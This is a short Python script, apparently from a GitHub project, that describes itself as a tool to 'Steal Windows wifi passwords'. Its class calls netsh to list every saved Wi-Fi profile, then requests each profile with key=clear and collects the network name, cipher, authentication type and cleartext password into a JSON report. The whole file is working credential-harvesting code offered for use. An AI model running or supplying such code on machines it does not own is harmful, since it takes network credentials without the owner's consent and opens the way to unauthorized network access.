'''
Description: Steal Windows wifi passwords
Author: Benjamin Norman 2022 (https://github.com/BenjaminN117)
Compatability: Validated on Windows 10 19042.1288 (Should work on all versions of Windows 10 and 11)
Contact: Any issues? You can reach me via my Github (^above^)
'''
import json
import platform
import subprocess
import re
from typing import Dict

class StealWindowsWifiPasswords():
    
    ssidDict = Dict
    
    def __init__(self):
        self.ssidDict = {"Entries":{}}
        
    def get_windows_saved_ssids(self):
        # Get all saved SSIDs
        output = subprocess.check_output("netsh wlan show profiles").decode()
        profiles = re.findall(r"All User Profile\s(.*)", output)
        for profile in profiles:
            # for each SSID, remove spaces and colon and add to the dict
            ssid = profile.strip().strip(":").strip()
            self.ssidDict["Entries"][ssid] = {"Cipher":"", "Authentication":"", "Password":""}

    def get_windows_saved_wifi_passwords(self):
        for ssid in self.ssidDict["Entries"]:
            ssidDetails = subprocess.check_output(f"""netsh wlan show profile "{ssid}" key=clear""").decode()
            # Get the ciphers
            ciphers = re.findall(r"Cipher\s(.*)", ssidDetails)
            ciphers = "/".join([value.strip().strip(":").strip() for value in ciphers])
            # Get the authenitcation method
            authentication = re.findall(r"Authentication\s(.*)", ssidDetails)
            authentication = authentication[0].strip().strip(":").strip()
            # Get the Wi-Fi password
            key = re.findall(r"Key Content\s(.*)", ssidDetails)
            try:
                key = key[0].strip().strip(":").strip()
            except IndexError:
                key = "None"
            # Add the info to the dict
            self.ssidDict["Entries"][ssid]["Cipher"] = ciphers
            self.ssidDict["Entries"][ssid]["Authentication"] = authentication
            self.ssidDict["Entries"][ssid]["Password"] = key
        
    def steal(self):
        if platform.system() == "Windows":
            self.get_windows_saved_ssids()
            self.get_windows_saved_wifi_passwords()
            return json.dumps(self.ssidDict, indent=4)
        else:
            return(f"[-] {platform.system()} is not supported.")